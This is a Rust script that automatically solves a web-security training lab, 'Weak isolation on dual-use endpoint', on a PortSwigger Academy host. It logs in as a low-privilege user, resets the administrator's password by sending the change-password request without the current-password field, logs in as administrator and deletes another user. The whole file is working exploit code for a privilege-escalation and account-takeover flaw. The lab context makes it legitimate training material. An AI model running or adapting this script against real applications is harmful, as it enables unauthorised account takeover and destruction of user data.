/********************************************************************************
*
* Lab: Weak isolation on dual-use endpoint
*
* Hack Steps: 
*      1. Fetch the login page
*      2. Extract the csrf token and session cookie to login
*      3. Login as wiener
*      4. Fetch wiener's profle
*      5. Extract the csrf token needed for changing password
*      6. Change the administrato's password by removing the current-password 
*         parameter from the request to skip the validation
*      7. Fetch the login page
*      8. Extract the csrf token and session cookie to login
*      9. Login as administrator
*      10. Delete carlos from the admin panel
*
*********************************************************************************/
use lazy_static::lazy_static;
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a4a009804eaeab1812125b6002500a0.web-security-academy.net";
const NEW_ADMIN_PASSWORD: &str = "hacked"; // You can change this to what you want

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    print!("⦗1⦘ Fetching the login page.. ");
    flush_terminal();

    let login_page = fetch("/login");

    println!("{}", "OK".green());
    print!("⦗2⦘ Extracting the csrf token and session cookie to login.. ");
    flush_terminal();

    let mut session = get_session_cookie(&login_page);
    let mut csrf_token = get_csrf_token(login_page);

    println!("{}", "OK".green());
    print!("⦗3⦘ Logging in as wiener.. ",);
    flush_terminal();

    let login_as_wiener = login("wiener", "peter", &session, &csrf_token);

    println!("{}", "OK".green());
    print!("⦗4⦘ Fetching wiener's profle.. ",);
    flush_terminal();

    session = get_session_cookie(&login_as_wiener);
    let wiener_profile = fetch_with_session("/my-account", &session);

    println!("{}", "OK".green());
    print!("⦗5⦘ Extracting the csrf token needed for changing password.. ");
    flush_terminal();

    csrf_token = get_csrf_token(wiener_profile);
    println!("{}", "OK".green());

    print!(
        "⦗6⦘ Changing the administrator's password to {}.. ",
        NEW_ADMIN_PASSWORD.yellow()
    );
    flush_terminal();

    change_admin_password(&session, &csrf_token);

    println!("{}", "OK".green());
    print!("⦗7⦘ Fetching the login page.. ");
    flush_terminal();

    let login_page = fetch("/login");

    println!("{}", "OK".green());
    print!("⦗8⦘ Extracting the csrf token and session cookie to login.. ");
    flush_terminal();

    session = get_session_cookie(&login_page);
    csrf_token = get_csrf_token(login_page);

    println!("{}", "OK".green());
    print!("⦗9⦘ Logging in as administrator.. ",);
    flush_terminal();

    let login_as_admin = login("administrator", NEW_ADMIN_PASSWORD, &session, &csrf_token);

    println!("{}", "OK".green());
    print!("⦗10⦘ Deleting carlos from the admin panel.. ",);
    flush_terminal();

    session = get_session_cookie(&login_as_admin);
    fetch_with_session("/admin/delete?username=carlos", &session);

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn fetch(path: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn login(username: &str, password: &str, session: &str, csrf_token: &str) -> Response {
    WEB_CLIENT
        .post(format!("{LAB_URL}/login"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("username", username),
            ("password", password),
            ("csrf", &csrf_token),
        ]))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to login as wiener".red()))
}

fn change_admin_password(session: &str, csrf_token: &str) -> Response {
    WEB_CLIENT
        .post(format!("{LAB_URL}/my-account/change-password"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("username", "administrator"),
            ("new-password-1", NEW_ADMIN_PASSWORD),
            ("new-password-2", NEW_ADMIN_PASSWORD),
            ("csrf", &csrf_token),
        ]))
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to change administrator's password".red()
        ))
}

fn fetch_with_session(path: &str, session: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn get_csrf_token(response: Response) -> String {
    let document = Document::from(response.text().unwrap().as_str());
    document
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
        .expect(&format!("{}", "⦗!⦘ Failed to get the csrf".red()))
        .to_string()
}

fn get_session_cookie(response: &Response) -> String {
    let headers = response.headers();
    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*); Secure", cookie_header)
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
